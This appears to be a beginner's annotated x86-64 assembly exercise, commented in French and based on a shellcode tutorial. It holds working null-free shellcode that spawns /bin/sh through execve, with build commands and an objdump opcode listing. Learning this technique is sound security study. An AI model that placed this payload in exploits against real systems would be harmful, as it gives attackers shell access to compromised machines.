; nasm -f elf64 finaly_shellcode_asm.asm && ld finaly_shellcode_asm.o -o finaly_shellcode_asm
; https://www.kali-linux.fr/hacking/shellcodes-debutant
; objdump -d finaly_shellcode_asm.o -M intel

; OBJDUMP
;finaly_shellcode_asm.o:     format de fichier elf64-x86-64


;Déassemblage de la section .text :

;0000000000000000 <_start>:
;   0:	6a 3b                	push   0x3b
;   2:	58                   	pop    rax
;   3:	48 31 d2             	xor    rdx,rdx
;   6:	49 b8 2f 2f 62 69 6e 	movabs r8,0x68732f6e69622f2f
;   d:	2f 73 68 
;  10:	49 c1 e8 08          	shr    r8,0x8
;  14:	41 50                	push   r8
;  16:	48 89 e7             	mov    rdi,rsp
;  19:	52                   	push   rdx
;  1a:	57                   	push   rdi
;  1b:	48 89 e6             	mov    rsi,rsp
;  1e:	0f 05                	syscall
;  20:	6a 3c                	push   0x3c
;  22:	58                   	pop    rax
;  23:	48 31 ff             	xor    rdi,rdi
;  26:	0f 05                	syscall

; OPCODE (code d'operations)
; 6a = push 
; 3b = 0x3B
; etc...

BITS 64

global _start

section .text
_start:
    push 0x3b ; mov rax, 59 syscall_execve
    pop rax ; mov rax, 59
    xor rdx, rdx ; mov rdx, 0x0
    mov r8, 0x68732f6e69622f2f ; //bin/sh en little endian sans 0x0 devant car on fais le decalage avec shr
    shr r8, 0x8 ; on fais un decalage de 8 bits ce qui rajoute le \0 a la fin
    push r8
    mov rdi,rsp
    push rdx
    push rdi
    mov rsi,rsp
    syscall
    push 0x3c
    pop rax
    xor rdi,rdi ; mov rdi, 0x0
    syscall
